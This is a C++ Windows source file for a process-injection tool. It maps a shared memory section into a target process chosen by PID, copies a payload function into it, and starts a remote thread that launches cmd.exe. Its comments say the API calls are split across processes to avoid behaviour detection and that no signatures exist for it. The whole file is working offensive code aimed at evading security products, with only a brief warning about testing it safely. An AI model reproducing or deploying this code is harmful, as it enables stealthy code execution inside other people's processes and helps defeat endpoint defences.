//API spilt method, by calling API's in different processs to avoid any sort of behaviour detection
//borrwed code so please don not use it with carelessness,
//till now there are no signatures related to this

//Do not use this code unless and untill you dont know how to use this, and how to test such code in safe environment

#include <stdio.h>
#include <tchar.h>

#include <windows.h>
#include "Commctrl.h"
#include <string>
#include <iostream>
#include <tlhelp32.h>
#include <strsafe.h>
#pragma comment(lib, "ntdll")

typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;	PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID;
using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);
using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID ClientID);

//this is a definition for WinExec, taken from MSDN
//required so it can be called from the injected function
typedef int(WINAPI* myWinExec)(
	LPCSTR lpCmdLine,
	UINT   uCmdShow
	);

//all data parameters that will be needed by the injected function, e.g.: function names, parameters, etc...
struct PARAMETERS {
	SIZE_T FuncInj;
	char command[256];
};

//this is the to be injected function
int ToBeInjected(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData)
{
#ifdef _WIN64	
	PARAMETERS* myparam = (PARAMETERS*)0x0000440000000000; 	//parameters will be placed in fixed location
#endif
#ifdef _X86_	
	PARAMETERS* myparam = (PARAMETERS*)0x44000000; 	//parameters will be placed in fixed location
#endif
	myWinExec WE = (myWinExec)myparam->FuncInj; //we get the WinExec address and convert it to a function
	WE(myparam->command, 1); //call the function
	return 0;  //need to return something
}

DWORD Useless() {      //this is useless to our injection but is needed to calculate the length of MyFunc
	return 0;
}

//this is a structure to store injection related info, PID and function address
typedef struct INJECTINFO
{
	DWORD pid;
	LPVOID address;
} *LPINJECTINFO;

void ErrorExit(LPTSTR lpszFunction)
{
	// Retrieve the system error message for the last-error code
	LPVOID lpMsgBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)& lpMsgBuf,
		0, NULL);

	// Display the error message and exit the process
	wprintf(L"[-] %s failed with error 0x%x: %s", lpszFunction, dw, (wchar_t*)lpMsgBuf);

	LocalFree(lpMsgBuf);
	ExitProcess(dw);
}

int wmain(int argc, wchar_t** argv)
{
	if (argc < 3)
	{
		printf("Usage: inject.exe [process name] [case] [address]\n");
		return 1;
	}

	DWORD pid = _wtoi(argv[1]);
	printf("[+] PID is: %d,0x%x\n", (UINT)pid, (UINT)pid);
	int step = _wtoi(argv[2]);

	myNtCreateSection fNtCreateSection = (myNtCreateSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection"));
	myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));
	myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA("ntdll"), "RtlCreateUserThread"));
	LARGE_INTEGER sectionSize = { 4096 };
	SIZE_T size = 4096;
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL, remoteSectionAddress = (PVOID)0x0000440000000000;
	PVOID sc_address;
	HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

	if (step == 1)
	{
		// create a memory section
		fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)& sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

		// create a view of the memory section in the local process
		fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);

		// create a view of the memory section in the target process
		fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);


		const char* command = "cmd.exe";
		PARAMETERS data;
		data.FuncInj = (SIZE_T)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec");
		strcpy_s(data.command, command);

		//calculate our inejtec function size
		SIZE_T size_myFunc = (SIZE_T)Useless - (SIZE_T)ToBeInjected;



		// copy shellcode to the local view, which will get reflected in the target process's mapped view
		memcpy(localSectionAddress, &data, sizeof(data));

		sc_address = (PVOID)((SIZE_T)localSectionAddress + sizeof(data));
		memcpy(sc_address, (LPVOID)(ToBeInjected), size_myFunc);
		sc_address = (PVOID)((SIZE_T)remoteSectionAddress + sizeof(data));
		printf("[+] Allocated memory address in target process is: %I64d\n", (SIZE_T)sc_address);
		printf("[+] Allocated memory address in target process is: 0x%Ix\n", (SIZE_T)sc_address);
		char tText[1024];
		wsprintfA(tText, "cmd.exe /c CreateSectionInjection.exe %d 2 %I64d", pid, (SIZE_T)sc_address);

		WinExec(tText, 1);
	}
	if (step == 2)
	{
		sc_address = (LPVOID)_wtoi64(argv[3]);
		printf("[+] memory address in target process is: 0x%Ix\n", (SIZE_T)sc_address);

		HANDLE targetThreadHandle = NULL;
		fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, sc_address, NULL, &targetThreadHandle, NULL);
	}
	return 0;
}
